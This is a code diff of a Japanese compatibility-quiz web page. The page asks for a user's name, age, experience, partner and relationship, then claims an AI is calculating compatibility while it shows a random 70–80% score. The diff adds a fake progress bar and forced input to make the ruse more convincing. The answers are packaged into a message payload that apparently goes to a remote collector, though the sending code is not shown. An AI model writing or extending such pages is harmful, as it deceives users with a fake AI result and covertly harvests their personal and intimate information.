@@ -5,38 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>診断</title>
     <style>
-        body { 
-            font-family: sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            background: #f0f0f0; 
-        }
-        .box { 
-            background: #fff; 
-            padding: 40px; 
-            border-radius: 15px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-            width: 85%; 
-            max-width: 400px; 
-            text-align: center; 
-        }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            margin: 20px 0; 
-            border: 1px solid #ccc; 
-            border-radius: 5px; 
-            box-sizing: border-box; 
-            font-size: 16px; /* これでズームを防ぐよ */
-        }
-        button { 
-            padding: 12px 30px; 
-            cursor: pointer; 
-            font-size: 16px;
-        }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f0f0f0; }
+        .box { background: #fff; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        button { padding: 12px 30px; cursor: pointer; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; }
+        #progress-container { width: 100%; background: #eee; height: 10px; border-radius: 5px; margin-top: 20px; overflow: hidden; display: none; }
+        #progress-bar { width: 0%; height: 100%; background: #007bff; transition: width 0.3s; }
     </style>
 </head>
 <body>
@@ -45,6 +19,7 @@
         <p id="msg">開始ボタンを押してね</p>
         <input type="text" id="inputArea" style="display:none;">
         <button id="actionBtn">開始</button>
+        <div id="progress-container"><div id="progress-bar"></div></div>
     </div>
 
     <script>
@@ -54,13 +29,20 @@
         const keys = ["name", "age", "exp", "partner", "rel"];
 
         document.getElementById('actionBtn').onclick = () => {
+            const inputVal = document.getElementById('inputArea').value;
+            
+            if (step > 0 && inputVal.trim() === "") {
+                alert("何か入力してね！");
+                return;
+            }
+
             if (step === 0) {
                 step++;
                 document.getElementById('msg').innerText = questions[0];
                 document.getElementById('inputArea').style.display = 'block';
                 document.getElementById('actionBtn').innerText = '次へ';
             } else if (step <= questions.length) {
-                answers[keys[step - 1]] = document.getElementById('inputArea').value;
+                answers[keys[step - 1]] = inputVal;
                 document.getElementById('inputArea').value = '';
                 if (step < questions.length) {
                     document.getElementById('msg').innerText = questions[step];
@@ -76,6 +58,14 @@
             document.getElementById('msg').innerText = "AIが相性を計算しています...";
             document.getElementById('inputArea').style.display = 'none';
             document.getElementById('actionBtn').style.display = 'none';
+            document.getElementById('progress-container').style.display = 'block';
+
+            let width = 0;
+            const interval = setInterval(() => {
+                width += 10;
+                document.getElementById('progress-bar').style.width = width + "%";
+                if (width >= 100) clearInterval(interval);
+            }, 300);
 
             const score = Math.floor(Math.random() * (81 - 70) + 70);
             const data = { content: `結果:\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
@@ -86,7 +76,7 @@
 
             setTimeout(() => {
                 document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 2em; font-weight: bold; color: #ff6b81;">${score}%</p>`;
-            }, 3000);
+            }, 3500);
         }
     </script>
 </body>
